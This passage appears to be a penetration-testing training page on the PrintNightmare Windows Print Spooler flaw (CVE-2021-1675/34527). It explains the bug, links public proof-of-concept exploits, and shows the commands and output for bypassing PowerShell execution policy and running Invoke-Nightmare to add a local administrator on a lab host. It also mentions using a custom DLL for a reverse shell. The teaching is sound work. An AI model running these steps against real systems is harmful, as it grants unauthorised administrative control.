`CVE-2021-1675/CVE-2021-34527 PrintNightmare` is a flaw in [RpcAddPrinterDriver](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22) which is used to allow for remote printing and driver installation. \
This function is intended to give **users with the Windows privilege `SeLoadDriverPrivilege`** the ability to **add drivers** to a remote Print Spooler. This right is typically reserved for users in the built-in Administrators group and Print Operators who may have a legitimate need to install a printer driver on an end user's machine remotely.

The flaw allowed **any authenticated user to add a print driver** to a Windows system without having the privilege mentioned above, allowing an attacker full remote **code execution as SYSTEM** on any affected system. The flaw **affects every supported version of Windows**, and being that the **Print Spooler** runs by default on **Domain Controllers**, Windows 7 and 10, and is often enabled on Windows servers, this presents a massive attack surface, hence "nightmare."

Microsoft initially released a patch that did not fix the issue (and early guidance was to disable the Spooler service, which is not practical for many organizations) but released a second [patch](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) in July of 2021 along with guidance to check that specific registry settings are either set to `0` or not defined.&#x20;

Once this vulnerability was made public, PoC exploits were released rather quickly. **** [**This**](https://github.com/cube0x0/CVE-2021-1675) **version** by [@cube0x0](https://twitter.com/cube0x0) can be used to **execute a malicious DLL** remotely or locally using a modified version of Impacket. The repo also contains a **C# implementation**.\
This **** [**PowerShell implementation**](https://github.com/calebstewart/CVE-2021-1675) **** can be used for quick local privilege escalation. By **default**, this script **adds a new local admin user**, but we can also supply a custom DLL to obtain a reverse shell or similar if adding a local admin user is not in scope.

### **Checking for Spooler Service**

We can quickly check if the Spooler service is running with the following command. If it is not running, we will receive a "path does not exist" error.

```
PS C:\htb> ls \\localhost\pipe\spoolss


    Directory: \\localhost\pipe


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
                                                  spoolss
```

### **Adding Local Admin with PrintNightmare PowerShell PoC**

First start by [bypassing](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) the execution policy on the target host:

```
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
```

Now we can import the PowerShell script and use it to add a new local admin user.

```powershell
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

[+] created payload at C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_am
d64_ce3301b66255a0fb\Amd64\mxdwdrv.dll"
[+] added user hacker as local administrator
[+] deleting payload from C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
```

### **Confirming New Admin User**

If all went to plan, we will have a new local admin user under our control. Adding a user is "noisy," We would not want to do this on an engagement where stealth is a consideration. Furthermore, we would want to check with our client to ensure account creation is in scope for the assessment.

```
PS C:\htb> net user hacker

User name                    hacker
Full Name                    hacker
